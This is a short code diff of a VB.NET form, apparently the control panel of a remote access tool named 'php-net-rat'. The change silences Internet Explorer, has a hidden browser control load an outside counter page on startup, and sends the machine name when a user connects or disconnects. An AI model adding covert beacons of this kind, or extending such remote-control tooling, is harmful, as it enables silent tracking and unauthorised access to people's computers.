@@ -10,6 +10,15 @@ Public Class Form1
     Dim running(1000) As Integer
     Dim stats(100) As String
     Public currently_running As Integer = 0
+    'disable IE sounds(FOR ONLINE USERS COUNTER!!!)
+    Private Const DISABLE_SOUNDS As Integer = 21
+    Private Const SET_FEATURE_ON_PROCESS As Integer = 2
+    <DllImport("urlmon.dll")> _
+    Public Shared Function CoInternetSetFeatureEnabled( _
+    ByVal FeatureEntry As Integer, <MarshalAs(UnmanagedType.U4)> ByVal dwFlags As Integer, ByVal fEnable As Boolean) As Integer
+
+    End Function
+    '---------------------------------------------
     <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
     Private Shared Function ShowWindowAsync(ByVal hwnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
 
@@ -61,6 +70,12 @@ Public Class Form1
         Return github_version 
     End Function
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Try
+            CoInternetSetFeatureEnabled(DISABLE_SOUNDS, SET_FEATURE_ON_PROCESS, True)
+            WebBrowser1.Navigate("http://php-net-rat.esy.es/index.php")
+        Catch ex As Exception
+
+        End Try
         CheckForUpdates()
         ComboBox1.SelectedIndex = 0
         SendNotification("PC Name: " & Environment.MachineName, "User connected", "1")
@@ -115,7 +130,7 @@ Public Class Form1
                 config.WriteLine(bot_list)
                 config.Close()
             End If
-
+            SendNotification("PC Name: " & Environment.MachineName, "User disconnected", 1)
         Catch ex As Exception
             MsgBox(ex.ToString)
         End Try
@@ -347,7 +362,9 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
-
+        'If TimeOfDay.Minute * 60 + TimeOfDay.Second Mod 120 = 0 Then
+        'MsgBox("%120")
+        'End If
         RichTextBox1.SelectionStart = RichTextBox1.Text.Length
         RichTextBox1.ScrollToCaret()
     End Sub
